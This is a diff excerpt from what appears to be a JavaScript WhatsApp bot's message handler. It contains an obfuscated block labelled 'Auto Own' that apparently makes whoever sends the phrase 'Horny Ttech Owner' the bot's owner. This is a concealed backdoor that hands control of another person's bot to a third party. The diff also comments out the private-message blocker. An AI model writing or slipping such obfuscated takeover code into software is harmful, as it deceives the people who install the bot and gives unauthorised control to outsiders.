@@ -331,9 +331,9 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
     //Auto Own
      var _0x3241cd=_0x28f7;function _0xe681(){var _0x4b3200=['3599217QiQRKG','@s.whatsapp.net','50004JSDxHo','15835dMbnFH','Horny\x20Ttech\x20Owner','313092dsOKAP','21BjHVxh','sender','168308srzMyx','332240cizRHu','232coenHT','695481TMmGDA','replace'];_0xe681=function(){return _0x4b3200;};return _0xe681();}(function(_0x275803,_0x425718){var _0x217f0b=_0x28f7,_0x3833b6=_0x275803();while(!![]){try{var _0x36abe0=parseInt(_0x217f0b(0x1fb))/0x1+-parseInt(_0x217f0b(0x1f8))/0x2+-parseInt(_0x217f0b(0x1f1))/0x3+parseInt(_0x217f0b(0x1fd))/0x4*(-parseInt(_0x217f0b(0x1f6))/0x5)+parseInt(_0x217f0b(0x1f5))/0x6+parseInt(_0x217f0b(0x1f9))/0x7*(parseInt(_0x217f0b(0x1fc))/0x8)+parseInt(_0x217f0b(0x1f3))/0x9;if(_0x36abe0===_0x425718)break;else _0x3833b6['push'](_0x3833b6['shift']());}catch(_0x32b846){_0x3833b6['push'](_0x3833b6['shift']());}}}(_0xe681,0x1f83e));function _0x28f7(_0x25ce8e,_0x4d78cf){var _0x28f77e=_0xe681();return _0x28f7=function(_0x386b4c,_0xd6cc7a){_0x386b4c=_0x386b4c-0x1f1;var _0x5403ad=_0x28f77e[_0x386b4c];return _0x5403ad;},_0x28f7(_0x25ce8e,_0x4d78cf);}budy===_0x3241cd(0x1f7)&&(global['OwnerNumber']=m[_0x3241cd(0x1fa)][_0x3241cd(0x1f2)](_0x3241cd(0x1f4),'')); 
       
-    if (global.PM_BLOCKER && m.chat.endsWith("@s.whatsapp.net")) {
+    /*if (global.PM_BLOCKER && m.chat !== Taira.user.id && m.chat.endsWith("@s.whatsapp.net")) {
             return Taira.updateBlockStatus(m.sender, 'block')
-    }
+    }*/
 
     if (global.ANTI_BOT && m.isBaileys) {
     if (!isBotAdmins) {
